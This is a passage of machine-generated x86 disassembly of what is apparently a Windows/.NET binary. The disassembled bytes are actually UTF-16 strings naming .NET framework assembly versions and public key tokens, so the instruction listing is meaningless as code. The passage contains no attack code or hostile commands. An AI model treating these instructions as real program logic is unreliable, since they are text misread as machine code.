  409b16:	add    BYTE PTR gs:[ebp+0x0],ch
  409b1a:	add    BYTE PTR gs:[esi+0x0],ch
  409b1e:	je     0x409b20
  409b20:	sub    al,0x0
  409b22:	and    BYTE PTR [eax],al
  409b24:	push   esi
  409b25:	add    BYTE PTR [ebp+0x0],ah
  409b28:	jb     0x409b2a
  409b2a:	jae    0x409b2c
  409b2c:	imul   eax,DWORD PTR [eax],0x6e006f
  409b32:	cmp    eax,0x2e003200
  409b37:	add    BYTE PTR [eax],dh
  409b39:	add    BYTE PTR [esi],ch
  409b3b:	add    BYTE PTR [eax],dh
  409b3d:	add    BYTE PTR [esi],ch
  409b3f:	add    BYTE PTR [eax],dh
  409b41:	add    BYTE PTR [eax+eax*1],ch
  409b44:	and    BYTE PTR [eax],al
  409b46:	inc    ebx
  409b47:	add    BYTE PTR [ebp+0x0],dh
  409b4a:	ins    BYTE PTR es:[edi],dx
  409b4b:	add    BYTE PTR [eax+eax*1+0x75],dh
  409b4f:	add    BYTE PTR [edx+0x0],dh
  409b52:	add    BYTE PTR gs:0x65006e00,bh
  409b59:	add    BYTE PTR [ebp+0x0],dh
  409b5c:	je     0x409b5e
  409b5e:	jb     0x409b60
  409b60:	popa   
  409b61:	add    BYTE PTR [eax+eax*1+0x2c],ch
  409b65:	add    BYTE PTR [eax],ah
  409b67:	add    BYTE PTR [eax+0x0],dl
  409b6a:	jne    0x409b6c
  409b6c:	bound  eax,QWORD PTR [eax]
  409b6e:	ins    BYTE PTR es:[edi],dx
  409b6f:	add    BYTE PTR [ecx+0x0],ch
  409b72:	arpl   WORD PTR [eax],ax
  409b74:	dec    ebx
  409b75:	add    BYTE PTR [ebp+0x0],ah
  409b78:	jns    0x409b7a
  409b7a:	push   esp
  409b7b:	add    BYTE PTR [edi+0x0],ch
  409b7e:	imul   eax,DWORD PTR [eax],0x65
  409b81:	add    BYTE PTR [esi+0x0],ch
  409b84:	cmp    eax,0x30006200
  409b89:	add    BYTE PTR [ebx],dh
  409b8b:	add    BYTE PTR [esi+0x0],ah
  409b8e:	xor    eax,0x37006600
  409b93:	add    BYTE PTR [esi+0x0],ah
  409b96:	xor    DWORD PTR [eax],eax
  409b98:	xor    DWORD PTR [eax],eax
  409b9a:	add    BYTE PTR fs:0x61003000,dh
  409ba1:	add    BYTE PTR [ebx],dh
  409ba3:	add    BYTE PTR [ecx+0x0],ah
  409ba6:	and    BYTE PTR [esi+0x790053],0x73
  409bad:	add    BYTE PTR [eax+eax*1+0x65],dh
  409bb1:	add    BYTE PTR [ebp+0x0],ch
  409bb4:	add    BYTE PTR cs:[ebp+0x0],cl
  409bb8:	add    BYTE PTR gs:[ebx+0x0],dh
  409bbc:	jae    0x409bbe
  409bbe:	popa   
  409bbf:	add    BYTE PTR [edi+0x0],ah
  409bc2:	imul   eax,DWORD PTR [eax],0x67006e
  409bc8:	sub    al,0x0
  409bca:	and    BYTE PTR [eax],al
  409bcc:	push   esi
  409bcd:	add    BYTE PTR [ebp+0x0],ah
  409bd0:	jb     0x409bd2
  409bd2:	jae    0x409bd4
  409bd4:	imul   eax,DWORD PTR [eax],0x6e006f
  409bda:	cmp    eax,0x2e003200
  409bdf:	add    BYTE PTR [eax],dh
  409be1:	add    BYTE PTR [esi],ch
  409be3:	add    BYTE PTR [eax],dh
  409be5:	add    BYTE PTR [esi],ch
  409be7:	add    BYTE PTR [eax],dh
  409be9:	add    BYTE PTR [eax+eax*1],ch
  409bec:	and    BYTE PTR [eax],al
  409bee:	inc    ebx
  409bef:	add    BYTE PTR [ebp+0x0],dh
  409bf2:	ins    BYTE PTR es:[edi],dx
  409bf3:	add    BYTE PTR [eax+eax*1+0x75],dh
  409bf7:	add    BYTE PTR [edx+0x0],dh
  409bfa:	add    BYTE PTR gs:0x65006e00,bh
  409c01:	add    BYTE PTR [ebp+0x0],dh
  409c04:	je     0x409c06
  409c06:	jb     0x409c08
  409c08:	popa   
  409c09:	add    BYTE PTR [eax+eax*1+0x2c],ch
  409c0d:	add    BYTE PTR [eax],ah
  409c0f:	add    BYTE PTR [eax+0x0],dl
  409c12:	jne    0x409c14
  409c14:	bound  eax,QWORD PTR [eax]
  409c16:	ins    BYTE PTR es:[edi],dx
  409c17:	add    BYTE PTR [ecx+0x0],ch
  409c1a:	arpl   WORD PTR [eax],ax
  409c1c:	dec    ebx
  409c1d:	add    BYTE PTR [ebp+0x0],ah
  409c20:	jns    0x409c22
  409c22:	push   esp
  409c23:	add    BYTE PTR [edi+0x0],ch
  409c26:	imul   eax,DWORD PTR [eax],0x65
  409c29:	add    BYTE PTR [esi+0x0],ch
  409c2c:	cmp    eax,0x30006200
  409c31:	add    BYTE PTR [ebx],dh
  409c33:	add    BYTE PTR [esi+0x0],ah
  409c36:	xor    eax,0x37006600
  409c3b:	add    BYTE PTR [esi+0x0],ah
  409c3e:	xor    DWORD PTR [eax],eax
  409c40:	xor    DWORD PTR [eax],eax
  409c42:	add    BYTE PTR fs:0x61003000,dh
  409c49:	add    BYTE PTR [ebx],dh
  409c4b:	add    BYTE PTR [ecx+0x0],ah
  409c4e:	sbb    dh,0x53
  409c51:	add    BYTE PTR [ecx+0x0],bh
  409c54:	jae    0x409c56
  409c56:	je     0x409c58
  409c58:	add    BYTE PTR gs:[ebp+0x0],ch
  409c5c:	add    BYTE PTR cs:[edx+0x0],dl
  409c60:	jne    0x409c62
  409c62:	outs   dx,BYTE PTR ds:[esi]
  409c63:	add    BYTE PTR [eax+eax*1+0x69],dh
  409c67:	add    BYTE PTR [ebp+0x0],ch
  409c6a:	add    BYTE PTR gs:[esi],ch
  409c6d:	add    BYTE PTR [ebx+0x0],dl
  409c70:	add    BYTE PTR gs:[edx+0x0],dh
  409c74:	imul   eax,DWORD PTR [eax],0x6c0061
  409c7a:	imul   eax,DWORD PTR [eax],0x61007a
  409c80:	je     0x409c82
  409c82:	imul   eax,DWORD PTR [eax],0x6e006f
  409c88:	add    BYTE PTR cs:[esi+0x0],al
  409c8c:	outs   dx,DWORD PTR ds:[esi]
  409c8d:	add    BYTE PTR [edx+0x0],dh
  409c90:	ins    DWORD PTR es:[edi],dx
  409c91:	add    BYTE PTR [ecx+0x0],ah
  409c94:	je     0x409c96
  409c96:	je     0x409c98
  409c98:	add    BYTE PTR gs:[edx+0x0],dh
  409c9c:	jae    0x409c9e
  409c9e:	add    BYTE PTR cs:[ebx+0x0],dl
  409ca2:	outs   dx,DWORD PTR ds:[esi]
  409ca3:	add    BYTE PTR [ecx+0x0],ah
  409ca6:	jo     0x409ca8
  409ca8:	sub    al,0x0
  409caa:	and    BYTE PTR [eax],al
  409cac:	push   esi
  409cad:	add    BYTE PTR [ebp+0x0],ah
  409cb0:	jb     0x409cb2
  409cb2:	jae    0x409cb4
  409cb4:	imul   eax,DWORD PTR [eax],0x6e006f
  409cba:	cmp    eax,0x2e003200
  409cbf:	add    BYTE PTR [eax],dh
  409cc1:	add    BYTE PTR [esi],ch
  409cc3:	add    BYTE PTR [eax],dh
  409cc5:	add    BYTE PTR [esi],ch
  409cc7:	add    BYTE PTR [eax],dh
  409cc9:	add    BYTE PTR [eax+eax*1],ch
  409ccc:	and    BYTE PTR [eax],al
  409cce:	inc    ebx
  409ccf:	add    BYTE PTR [ebp+0x0],dh
  409cd2:	ins    BYTE PTR es:[edi],dx
  409cd3:	add    BYTE PTR [eax+eax*1+0x75],dh
  409cd7:	add    BYTE PTR [edx+0x0],dh
  409cda:	add    BYTE PTR gs:0x65006e00,bh
  409ce1:	add    BYTE PTR [ebp+0x0],dh
  409ce4:	je     0x409ce6
  409ce6:	jb     0x409ce8
  409ce8:	popa   
  409ce9:	add    BYTE PTR [eax+eax*1+0x2c],ch
  409ced:	add    BYTE PTR [eax],ah
  409cef:	add    BYTE PTR [eax+0x0],dl
  409cf2:	jne    0x409cf4
  409cf4:	bound  eax,QWORD PTR [eax]
  409cf6:	ins    BYTE PTR es:[edi],dx
  409cf7:	add    BYTE PTR [ecx+0x0],ch
  409cfa:	arpl   WORD PTR [eax],ax
  409cfc:	dec    ebx
  409cfd:	add    BYTE PTR [ebp+0x0],ah
  409d00:	jns    0x409d02
  409d02:	push   esp
  409d03:	add    BYTE PTR [edi+0x0],ch
  409d06:	imul   eax,DWORD PTR [eax],0x65
  409d09:	add    BYTE PTR [esi+0x0],ch
  409d0c:	cmp    eax,0x30006200
  409d11:	add    BYTE PTR [ebx],dh
  409d13:	add    BYTE PTR [esi+0x0],ah
  409d16:	xor    eax,0x37006600
  409d1b:	add    BYTE PTR [esi+0x0],ah
  409d1e:	xor    DWORD PTR [eax],eax
  409d20:	xor    DWORD PTR [eax],eax
  409d22:	add    BYTE PTR fs:0x61003000,dh
  409d29:	add    BYTE PTR [ebx],dh
  409d2b:	add    BYTE PTR [ecx+0x0],ah
  409d2e:	and    BYTE PTR [ebx+edx*2+0x73007900],0x0
  409d36:	je     0x409d38
  409d38:	add    BYTE PTR gs:[ebp+0x0],ch
  409d3c:	add    BYTE PTR cs:[ebx+0x0],dl
  409d40:	add    BYTE PTR gs:[ebx+0x0],ah
  409d44:	jne    0x409d46
  409d46:	jb     0x409d48
  409d48:	imul   eax,DWORD PTR [eax],0x790074
  409d4e:	sub    al,0x0
  409d50:	and    BYTE PTR [eax],al
  409d52:	push   esi
  409d53:	add    BYTE PTR [ebp+0x0],ah
  409d56:	jb     0x409d58
  409d58:	jae    0x409d5a
  409d5a:	imul   eax,DWORD PTR [eax],0x6e006f
  409d60:	cmp    eax,0x2e003200
  409d65:	add    BYTE PTR [eax],dh
  409d67:	add    BYTE PTR [esi],ch
  409d69:	add    BYTE PTR [eax],dh
  409d6b:	add    BYTE PTR [esi],ch
  409d6d:	add    BYTE PTR [eax],dh
  409d6f:	add    BYTE PTR [eax+eax*1],ch
  409d72:	and    BYTE PTR [eax],al
  409d74:	inc    ebx
  409d75:	add    BYTE PTR [ebp+0x0],dh
  409d78:	ins    BYTE PTR es:[edi],dx
  409d79:	add    BYTE PTR [eax+eax*1+0x75],dh
  409d7d:	add    BYTE PTR [edx+0x0],dh
  409d80:	add    BYTE PTR gs:0x65006e00,bh
  409d87:	add    BYTE PTR [ebp+0x0],dh
  409d8a:	je     0x409d8c
  409d8c:	jb     0x409d8e
  409d8e:	popa   
  409d8f:	add    BYTE PTR [eax+eax*1+0x2c],ch
  409d93:	add    BYTE PTR [eax],ah
  409d95:	add    BYTE PTR [eax+0x0],dl
  409d98:	jne    0x409d9a
  409d9a:	bound  eax,QWORD PTR [eax]
  409d9c:	ins    BYTE PTR es:[edi],dx
  409d9d:	add    BYTE PTR [ecx+0x0],ch
  409da0:	arpl   WORD PTR [eax],ax
  409da2:	dec    ebx
  409da3:	add    BYTE PTR [ebp+0x0],ah
  409da6:	jns    0x409da8
  409da8:	push   esp
  409da9:	add    BYTE PTR [edi+0x0],ch
  409dac:	imul   eax,DWORD PTR [eax],0x65
  409daf:	add    BYTE PTR [esi+0x0],ch
  409db2:	cmp    eax,0x30006200
  409db7:	add    BYTE PTR [ebx],dh
  409db9:	add    BYTE PTR [esi+0x0],ah
  409dbc:	xor    eax,0x37006600
  409dc1:	add    BYTE PTR [esi+0x0],ah
  409dc4:	xor    DWORD PTR [eax],eax
  409dc6:	xor    DWORD PTR [eax],eax
  409dc8:	add    BYTE PTR fs:0x61003000,dh
  409dcf:	add    BYTE PTR [ebx],dh
  409dd1:	add    BYTE PTR [ecx+0x0],ah
  409dd4:	xor    BYTE PTR [eax+0x790053],0x73
  409ddb:	add    BYTE PTR [eax+eax*1+0x65],dh
  409ddf:	add    BYTE PTR [ebp+0x0],ch
  409de2:	add    BYTE PTR cs:[ebx+0x0],dl
  409de6:	add    BYTE PTR gs:[edx+0x0],dh
  409dea:	jbe    0x409dec
  409dec:	imul   eax,DWORD PTR [eax],0x650063
  409df2:	push   eax
  409df3:	add    BYTE PTR [edx+0x0],dh
  409df6:	outs   dx,DWORD PTR ds:[esi]
  409df7:	add    BYTE PTR [ebx+0x0],ah
  409dfa:	add    BYTE PTR gs:[ebx+0x0],dh
  409dfe:	jae    0x409e00
  409e00:	sub    al,0x0
  409e02:	and    BYTE PTR [eax],al
  409e04:	push   esi
  409e05:	add    BYTE PTR [ebp+0x0],ah
  409e08:	jb     0x409e0a
  409e0a:	jae    0x409e0c
  409e0c:	imul   eax,DWORD PTR [eax],0x6e006f
  409e12:	cmp    eax,0x2e003200
  409e17:	add    BYTE PTR [eax],dh
  409e19:	add    BYTE PTR [esi],ch
  409e1b:	add    BYTE PTR [eax],dh
  409e1d:	add    BYTE PTR [esi],ch
  409e1f:	add    BYTE PTR [eax],dh
  409e21:	add    BYTE PTR [eax+eax*1],ch
  409e24:	and    BYTE PTR [eax],al
  409e26:	inc    ebx
  409e27:	add    BYTE PTR [ebp+0x0],dh
  409e2a:	ins    BYTE PTR es:[edi],dx
  409e2b:	add    BYTE PTR [eax+eax*1+0x75],dh
  409e2f:	add    BYTE PTR [edx+0x0],dh
  409e32:	add    BYTE PTR gs:0x65006e00,bh
  409e39:	add    BYTE PTR [ebp+0x0],dh
  409e3c:	je     0x409e3e
  409e3e:	jb     0x409e40
  409e40:	popa   
  409e41:	add    BYTE PTR [eax+eax*1+0x2c],ch
  409e45:	add    BYTE PTR [eax],ah
  409e47:	add    BYTE PTR [eax+0x0],dl
  409e4a:	jne    0x409e4c
  409e4c:	bound  eax,QWORD PTR [eax]
  409e4e:	ins    BYTE PTR es:[edi],dx
  409e4f:	add    BYTE PTR [ecx+0x0],ch
  409e52:	arpl   WORD PTR [eax],ax
  409e54:	dec    ebx
  409e55:	add    BYTE PTR [ebp+0x0],ah
  409e58:	jns    0x409e5a
  409e5a:	push   esp
  409e5b:	add    BYTE PTR [edi+0x0],ch
  409e5e:	imul   eax,DWORD PTR [eax],0x65
  409e61:	add    BYTE PTR [esi+0x0],ch
  409e64:	cmp    eax,0x30006200
  409e69:	add    BYTE PTR [ebx],dh
  409e6b:	add    BYTE PTR [esi+0x0],ah
  409e6e:	xor    eax,0x37006600
  409e73:	add    BYTE PTR [esi+0x0],ah
  409e76:	xor    DWORD PTR [eax],eax
  409e78:	xor    DWORD PTR [eax],eax
  409e7a:	add    BYTE PTR fs:0x61003000,dh
  409e81:	add    BYTE PTR [ebx],dh
  409e83:	add    BYTE PTR [ecx+0x0],ah
  409e86:	sbb    BYTE PTR [edx+0x790053],0x73
  409e8d:	add    BYTE PTR [eax+eax*1+0x65],dh
  409e91:	add    BYTE PTR [ebp+0x0],ch
  409e94:	add    BYTE PTR cs:[edi+0x0],dl
  409e98:	add    BYTE PTR gs:[edx+0x0],ah
  409e9c:	sub    al,0x0
  409e9e:	and    BYTE PTR [eax],al
  409ea0:	push   esi
  409ea1:	add    BYTE PTR [ebp+0x0],ah
  409ea4:	jb     0x409ea6
  409ea6:	jae    0x409ea8
  409ea8:	imul   eax,DWORD PTR [eax],0x6e006f
  409eae:	cmp    eax,0x2e003200
  409eb3:	add    BYTE PTR [eax],dh
  409eb5:	add    BYTE PTR [esi],ch
  409eb7:	add    BYTE PTR [eax],dh
  409eb9:	add    BYTE PTR [esi],ch
  409ebb:	add    BYTE PTR [eax],dh
  409ebd:	add    BYTE PTR [eax+eax*1],ch
  409ec0:	and    BYTE PTR [eax],al
  409ec2:	inc    ebx
  409ec3:	add    BYTE PTR [ebp+0x0],dh
  409ec6:	ins    BYTE PTR es:[edi],dx
  409ec7:	add    BYTE PTR [eax+eax*1+0x75],dh
  409ecb:	add    BYTE PTR [edx+0x0],dh
  409ece:	add    BYTE PTR gs:0x65006e00,bh
  409ed5:	add    BYTE PTR [ebp+0x0],dh
  409ed8:	je     0x409eda
  409eda:	jb     0x409edc
  409edc:	popa   
  409edd:	add    BYTE PTR [eax+eax*1+0x2c],ch
  409ee1:	add    BYTE PTR [eax],ah
  409ee3:	add    BYTE PTR [eax+0x0],dl
  409ee6:	jne    0x409ee8
  409ee8:	bound  eax,QWORD PTR [eax]
  409eea:	ins    BYTE PTR es:[edi],dx
  409eeb:	add    BYTE PTR [ecx+0x0],ch
  409eee:	arpl   WORD PTR [eax],ax
  409ef0:	dec    ebx
  409ef1:	add    BYTE PTR [ebp+0x0],ah
  409ef4:	jns    0x409ef6
  409ef6:	push   esp
  409ef7:	add    BYTE PTR [edi+0x0],ch
  409efa:	imul   eax,DWORD PTR [eax],0x65
  409efd:	add    BYTE PTR [esi+0x0],ch
  409f00:	cmp    eax,0x30006200
  409f05:	add    BYTE PTR [ebx],dh
  409f07:	add    BYTE PTR [esi+0x0],ah
  409f0a:	xor    eax,0x37006600
  409f0f:	add    BYTE PTR [esi+0x0],ah
  409f12:	xor    DWORD PTR [eax],eax
  409f14:	xor    DWORD PTR [eax],eax
  409f16:	add    BYTE PTR fs:0x61003000,dh
  409f1d:	add    BYTE PTR [ebx],dh
  409f1f:	add    BYTE PTR [ecx+0x0],ah
  409f22:	xor    BYTE PTR [ebx+edx*2+0x73007900],0x0
  409f2a:	je     0x409f2c
  409f2c:	add    BYTE PTR gs:[ebp+0x0],ch
  409f30:	add    BYTE PTR cs:[edi+0x0],dl
  409f34:	add    BYTE PTR gs:[edx+0x0],ah
  409f38:	add    BYTE PTR cs:[ecx+0x0],al
  409f3c:	bound  eax,QWORD PTR [eax]
  409f3e:	jae    0x409f40
  409f40:	je     0x409f42
  409f42:	jb     0x409f44
  409f44:	popa   
  409f45:	add    BYTE PTR [ebx+0x0],ah
  409f48:	je     0x409f4a
  409f4a:	imul   eax,DWORD PTR [eax],0x6e006f
  409f50:	jae    0x409f52
  409f52:	sub    al,0x0
  409f54:	and    BYTE PTR [eax],al
  409f56:	push   esi
  409f57:	add    BYTE PTR [ebp+0x0],ah
  409f5a:	jb     0x409f5c
  409f5c:	jae    0x409f5e
  409f5e:	imul   eax,DWORD PTR [eax],0x6e006f
  409f64:	cmp    eax,0x2e003300
  409f69:	add    BYTE PTR ds:0x30002e00,dh
  409f6f:	add    BYTE PTR [esi],ch
  409f71:	add    BYTE PTR [eax],dh
  409f73:	add    BYTE PTR [eax+eax*1],ch
  409f76:	and    BYTE PTR [eax],al
  409f78:	inc    ebx
  409f79:	add    BYTE PTR [ebp+0x0],dh
  409f7c:	ins    BYTE PTR es:[edi],dx
  409f7d:	add    BYTE PTR [eax+eax*1+0x75],dh
  409f81:	add    BYTE PTR [edx+0x0],dh
  409f84:	add    BYTE PTR gs:0x65006e00,bh
  409f8b:	add    BYTE PTR [ebp+0x0],dh
  409f8e:	je     0x409f90
  409f90:	jb     0x409f92
  409f92:	popa   
  409f93:	add    BYTE PTR [eax+eax*1+0x2c],ch
  409f97:	add    BYTE PTR [eax],ah
  409f99:	add    BYTE PTR [eax+0x0],dl
  409f9c:	jne    0x409f9e
  409f9e:	bound  eax,QWORD PTR [eax]
  409fa0:	ins    BYTE PTR es:[edi],dx
  409fa1:	add    BYTE PTR [ecx+0x0],ch
  409fa4:	arpl   WORD PTR [eax],ax
  409fa6:	dec    ebx
  409fa7:	add    BYTE PTR [ebp+0x0],ah
  409faa:	jns    0x409fac
  409fac:	push   esp
  409fad:	add    BYTE PTR [edi+0x0],ch
  409fb0:	imul   eax,DWORD PTR [eax],0x65
  409fb3:	add    BYTE PTR [esi+0x0],ch
  409fb6:	cmp    eax,0x31003300
  409fbb:	add    BYTE PTR [edx+0x0],ah
  409fbe:	data16 add BYTE PTR [ebx],dh
  409fc1:	add    BYTE PTR [eax],bh
  409fc3:	add    BYTE PTR ds:0x61003600,dh
  409fc9:	add    BYTE PTR [eax+eax*1+0x33],ah
  409fcd:	add    BYTE PTR [esi],dh
  409fcf:	add    BYTE PTR [eax+eax*1],dh
  409fd2:	add    BYTE PTR gs:[ebx],dh
  409fd5:	add    BYTE PTR ds:0x53b28000,dh
  409fdb:	add    BYTE PTR [ecx+0x0],bh
  409fde:	jae    0x409fe0
  409fe0:	je     0x409fe2
  409fe2:	add    BYTE PTR gs:[ebp+0x0],ch
  409fe6:	add    BYTE PTR cs:[edi+0x0],dl
  409fea:	add    BYTE PTR gs:[edx+0x0],ah
  409fee:	add    BYTE PTR cs:[eax+eax*1+0x79],al
  409ff3:	add    BYTE PTR [esi+0x0],ch
  409ff6:	popa   
  409ff7:	add    BYTE PTR [ebp+0x0],ch
  409ffa:	imul   eax,DWORD PTR [eax],0x440063
  40a000:	popa   
  40a001:	add    BYTE PTR [eax+eax*1+0x61],dh
  40a005:	add    BYTE PTR [eax+eax*1],ch
  40a008:	and    BYTE PTR [eax],al
  40a00a:	push   esi
  40a00b:	add    BYTE PTR [ebp+0x0],ah
  40a00e:	jb     0x40a010
  40a010:	jae    0x40a012
  40a012:	imul   eax,DWORD PTR [eax],0x6e006f
  40a018:	cmp    eax,0x2e003300
  40a01d:	add    BYTE PTR ds:0x30002e00,dh
  40a023:	add    BYTE PTR [esi],ch
  40a025:	add    BYTE PTR [eax],dh
  40a027:	add    BYTE PTR [eax+eax*1],ch
  40a02a:	and    BYTE PTR [eax],al
  40a02c:	inc    ebx
  40a02d:	add    BYTE PTR [ebp+0x0],dh
  40a030:	ins    BYTE PTR es:[edi],dx
  40a031:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a035:	add    BYTE PTR [edx+0x0],dh
  40a038:	add    BYTE PTR gs:0x65006e00,bh
  40a03f:	add    BYTE PTR [ebp+0x0],dh
  40a042:	je     0x40a044
  40a044:	jb     0x40a046
  40a046:	popa   
  40a047:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a04b:	add    BYTE PTR [eax],ah
  40a04d:	add    BYTE PTR [eax+0x0],dl
  40a050:	jne    0x40a052
  40a052:	bound  eax,QWORD PTR [eax]
  40a054:	ins    BYTE PTR es:[edi],dx
  40a055:	add    BYTE PTR [ecx+0x0],ch
  40a058:	arpl   WORD PTR [eax],ax
  40a05a:	dec    ebx
  40a05b:	add    BYTE PTR [ebp+0x0],ah
  40a05e:	jns    0x40a060
  40a060:	push   esp
  40a061:	add    BYTE PTR [edi+0x0],ch
  40a064:	imul   eax,DWORD PTR [eax],0x65
  40a067:	add    BYTE PTR [esi+0x0],ch
  40a06a:	cmp    eax,0x31003300
  40a06f:	add    BYTE PTR [edx+0x0],ah
  40a072:	data16 add BYTE PTR [ebx],dh
  40a075:	add    BYTE PTR [eax],bh
  40a077:	add    BYTE PTR ds:0x61003600,dh
  40a07d:	add    BYTE PTR [eax+eax*1+0x33],ah
  40a081:	add    BYTE PTR [esi],dh
  40a083:	add    BYTE PTR [eax+eax*1],dh
  40a086:	add    BYTE PTR gs:[ebx],dh
  40a089:	add    BYTE PTR ds:0x53c08000,dh
  40a08f:	add    BYTE PTR [ecx+0x0],bh
  40a092:	jae    0x40a094
  40a094:	je     0x40a096
  40a096:	add    BYTE PTR gs:[ebp+0x0],ch
  40a09a:	add    BYTE PTR cs:[edi+0x0],dl
  40a09e:	add    BYTE PTR gs:[edx+0x0],ah
  40a0a2:	add    BYTE PTR cs:[eax+eax*1+0x79],al
  40a0a7:	add    BYTE PTR [esi+0x0],ch
  40a0aa:	popa   
  40a0ab:	add    BYTE PTR [ebp+0x0],ch
  40a0ae:	imul   eax,DWORD PTR [eax],0x440063
  40a0b4:	popa   
  40a0b5:	add    BYTE PTR [eax+eax*1+0x61],dh
  40a0b9:	add    BYTE PTR [esi],ch
  40a0bb:	add    BYTE PTR [eax+eax*1+0x65],al
  40a0bf:	add    BYTE PTR [ebx+0x0],dh
  40a0c2:	imul   eax,DWORD PTR [eax],0x6e0067
  40a0c8:	sub    al,0x0
  40a0ca:	and    BYTE PTR [eax],al
  40a0cc:	push   esi
  40a0cd:	add    BYTE PTR [ebp+0x0],ah
  40a0d0:	jb     0x40a0d2
  40a0d2:	jae    0x40a0d4
  40a0d4:	imul   eax,DWORD PTR [eax],0x6e006f
  40a0da:	cmp    eax,0x2e003300
  40a0df:	add    BYTE PTR ds:0x30002e00,dh
  40a0e5:	add    BYTE PTR [esi],ch
  40a0e7:	add    BYTE PTR [eax],dh
  40a0e9:	add    BYTE PTR [eax+eax*1],ch
  40a0ec:	and    BYTE PTR [eax],al
  40a0ee:	inc    ebx
  40a0ef:	add    BYTE PTR [ebp+0x0],dh
  40a0f2:	ins    BYTE PTR es:[edi],dx
  40a0f3:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a0f7:	add    BYTE PTR [edx+0x0],dh
  40a0fa:	add    BYTE PTR gs:0x65006e00,bh
  40a101:	add    BYTE PTR [ebp+0x0],dh
  40a104:	je     0x40a106
  40a106:	jb     0x40a108
  40a108:	popa   
  40a109:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a10d:	add    BYTE PTR [eax],ah
  40a10f:	add    BYTE PTR [eax+0x0],dl
  40a112:	jne    0x40a114
  40a114:	bound  eax,QWORD PTR [eax]
  40a116:	ins    BYTE PTR es:[edi],dx
  40a117:	add    BYTE PTR [ecx+0x0],ch
  40a11a:	arpl   WORD PTR [eax],ax
  40a11c:	dec    ebx
  40a11d:	add    BYTE PTR [ebp+0x0],ah
  40a120:	jns    0x40a122
  40a122:	push   esp
  40a123:	add    BYTE PTR [edi+0x0],ch
  40a126:	imul   eax,DWORD PTR [eax],0x65
  40a129:	add    BYTE PTR [esi+0x0],ch
  40a12c:	cmp    eax,0x31003300
  40a131:	add    BYTE PTR [edx+0x0],ah
  40a134:	data16 add BYTE PTR [ebx],dh
  40a137:	add    BYTE PTR [eax],bh
  40a139:	add    BYTE PTR ds:0x61003600,dh
  40a13f:	add    BYTE PTR [eax+eax*1+0x33],ah
  40a143:	add    BYTE PTR [esi],dh
  40a145:	add    BYTE PTR [eax+eax*1],dh
  40a148:	add    BYTE PTR gs:[ebx],dh
  40a14b:	add    BYTE PTR ds:0x53b68000,dh
  40a151:	add    BYTE PTR [ecx+0x0],bh
  40a154:	jae    0x40a156
  40a156:	je     0x40a158
  40a158:	add    BYTE PTR gs:[ebp+0x0],ch
  40a15c:	add    BYTE PTR cs:[edi+0x0],dl
  40a160:	add    BYTE PTR gs:[edx+0x0],ah
  40a164:	add    BYTE PTR cs:[ebp+0x0],al
  40a168:	outs   dx,BYTE PTR ds:[esi]
  40a169:	add    BYTE PTR [eax+eax*1+0x69],dh
  40a16d:	add    BYTE PTR [eax+eax*1+0x79],dh
  40a171:	add    BYTE PTR [esi],ch
  40a173:	add    BYTE PTR [eax+eax*1+0x65],al
  40a177:	add    BYTE PTR [ebx+0x0],dh
  40a17a:	imul   eax,DWORD PTR [eax],0x6e0067
  40a180:	sub    al,0x0
  40a182:	and    BYTE PTR [eax],al
  40a184:	push   esi
  40a185:	add    BYTE PTR [ebp+0x0],ah
  40a188:	jb     0x40a18a
  40a18a:	jae    0x40a18c
  40a18c:	imul   eax,DWORD PTR [eax],0x6e006f
  40a192:	cmp    eax,0x2e003300
  40a197:	add    BYTE PTR ds:0x30002e00,dh
  40a19d:	add    BYTE PTR [esi],ch
  40a19f:	add    BYTE PTR [eax],dh
  40a1a1:	add    BYTE PTR [eax+eax*1],ch
  40a1a4:	and    BYTE PTR [eax],al
  40a1a6:	inc    ebx
  40a1a7:	add    BYTE PTR [ebp+0x0],dh
  40a1aa:	ins    BYTE PTR es:[edi],dx
  40a1ab:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a1af:	add    BYTE PTR [edx+0x0],dh
  40a1b2:	add    BYTE PTR gs:0x65006e00,bh
  40a1b9:	add    BYTE PTR [ebp+0x0],dh
  40a1bc:	je     0x40a1be
  40a1be:	jb     0x40a1c0
  40a1c0:	popa   
  40a1c1:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a1c5:	add    BYTE PTR [eax],ah
  40a1c7:	add    BYTE PTR [eax+0x0],dl
  40a1ca:	jne    0x40a1cc
  40a1cc:	bound  eax,QWORD PTR [eax]
  40a1ce:	ins    BYTE PTR es:[edi],dx
  40a1cf:	add    BYTE PTR [ecx+0x0],ch
  40a1d2:	arpl   WORD PTR [eax],ax
  40a1d4:	dec    ebx
  40a1d5:	add    BYTE PTR [ebp+0x0],ah
  40a1d8:	jns    0x40a1da
  40a1da:	push   esp
  40a1db:	add    BYTE PTR [edi+0x0],ch
  40a1de:	imul   eax,DWORD PTR [eax],0x65
  40a1e1:	add    BYTE PTR [esi+0x0],ch
  40a1e4:	cmp    eax,0x37006200
  40a1e9:	add    BYTE PTR [edi],dh
  40a1eb:	add    BYTE PTR [ecx+0x0],ah
  40a1ee:	xor    eax,0x35006300
  40a1f3:	add    BYTE PTR [esi],dh
  40a1f5:	add    BYTE PTR [ecx],dh
  40a1f7:	add    BYTE PTR [ecx],bh
  40a1f9:	add    BYTE PTR [ebx],dh
  40a1fb:	add    BYTE PTR [eax+eax*1],dh
  40a1fe:	add    BYTE PTR gs:[eax],dh
  40a201:	add    BYTE PTR [eax],bh
  40a203:	add    BYTE PTR [ecx],bh
  40a205:	add    BYTE PTR [eax+0x790053b0],al
  40a20b:	add    BYTE PTR [ebx+0x0],dh
  40a20e:	je     0x40a210
  40a210:	add    BYTE PTR gs:[ebp+0x0],ch
  40a214:	add    BYTE PTR cs:[edi+0x0],dl
  40a218:	add    BYTE PTR gs:[edx+0x0],ah
  40a21c:	add    BYTE PTR cs:[ebp+0x0],al
  40a220:	js     0x40a222
  40a222:	je     0x40a224
  40a224:	add    BYTE PTR gs:[esi+0x0],ch
  40a228:	jae    0x40a22a
  40a22a:	imul   eax,DWORD PTR [eax],0x6e006f
  40a230:	jae    0x40a232
  40a232:	sub    al,0x0
  40a234:	and    BYTE PTR [eax],al
  40a236:	push   esi
  40a237:	add    BYTE PTR [ebp+0x0],ah
  40a23a:	jb     0x40a23c
  40a23c:	jae    0x40a23e
  40a23e:	imul   eax,DWORD PTR [eax],0x6e006f
  40a244:	cmp    eax,0x2e003300
